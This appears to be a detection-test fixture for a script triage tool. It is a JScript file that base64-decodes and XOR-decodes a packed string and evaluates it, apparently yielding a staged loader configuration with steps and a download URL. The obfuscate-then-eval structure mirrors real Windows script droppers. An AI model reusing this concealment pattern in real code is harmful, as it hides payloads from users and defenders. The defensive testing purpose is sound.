// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_e0db86a2(item1) {
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ 135); }
  return item2;
}
function recover_9b79e7d5() {
  var packedText = "/KX08+L39KW93KXm5Pby7vXi2PXi6ujz4qWrpfD17vPi2OHu6+Klq6Xj7vT35vPk79j39ejk4vT0paul7+bp4+jh4dj05PXu9/Ol2qul5uPm9/Pi9aW9pcru5PXo9Ojh86nfysvP09PXpaul8" + "ebr8uL0pb38peTm6vfm7uDp2O7jpb2l5Obq9+bu4Omq4rbktrCzsrK+taWrpfL166W9pe/z8/f0vaio4rbktrCzsrK+tani/+bq9+viqe7p8ebr7uOo5L++vrC14eOp4+bzpaul8vTi9djm4O" + "Lp86W9pc/y6fP14vT0y+blqOK25Laws7KyvrWlq6Xh7uvi2Pfm8++lvaXEvdvb0vTi9fTb29fy5evu5Nvbz/Lp8/Xi9PTL5uXb2/Tz5uDiquK25Laws7KyvrWp4+bzpaul9eLg7vTz9f7Y9+b" + "z76W9pc/MxNLb29To4fPw5vXi29vP8unz9eL09Mvm5dvbw+709+j05uXr4tvb4rbktrCzsrK+taWrpeni//PY9PPm4OKlvaXr6OTm66rj7vT35vPk76nt9KX6q6X08+bg4sTo8unzpb2z+g==";
  var item1 = decodeBase64(packedText);
  var item6 = (2 > 1) ? "left" : "right";
  var item2 = [];
  for (var pass = 0; pass < 1; pass++) { item2 = decode_e0db86a2.apply(null, [item1]); }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < item2.length; bi++) { textParts.push(String.fromCharCode(item2[bi])); }
  var item3 = textParts.join("");
  return item3;
}
function inspect_04ed2e31() {
  var item4 = eval("(" + recover_9b79e7d5.apply(null, []) + ")");
  var item5 = new Object();
  item5.steps = item4.steps;
  item5.adapter = item4.adapter;
  item5.values = item4.values;
  item5.stageCount = item4.stageCount;
  return item5;
}
